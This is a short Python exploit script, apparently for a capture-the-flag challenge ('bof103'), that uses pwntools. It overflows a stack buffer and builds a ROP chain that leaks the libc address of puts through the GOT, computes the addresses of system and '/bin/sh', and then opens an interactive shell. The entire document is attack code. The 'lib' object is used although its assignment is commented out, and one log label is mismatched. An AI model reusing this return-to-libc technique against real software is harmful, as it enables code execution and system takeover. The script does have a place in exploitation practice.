
from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('bof103')
r= e.process()
# r = remote('bof101.sstf.site', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

main=0x0000000000400695
puts_got = 0x601018
puts_plt = 0x4004d0
pop_rdi_ret= 0x0000000000400723
ret=0x00000000004004b1
sysplt=0x4004e0


payload = b"".ljust(16, b"A")+b"b"*8
payload+= flat(pop_rdi_ret, puts_got, puts_plt, main)
pause()
r.sendlineafter(b"name?\n",payload)
r.recvline()

puts_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("setvbuf_libc: %#x" %puts_libc)
base_libc = puts_libc - lib.sym.puts
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)


payload = b"a"*32+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendlineafter(b"ame > ",payload)

r.interactive()
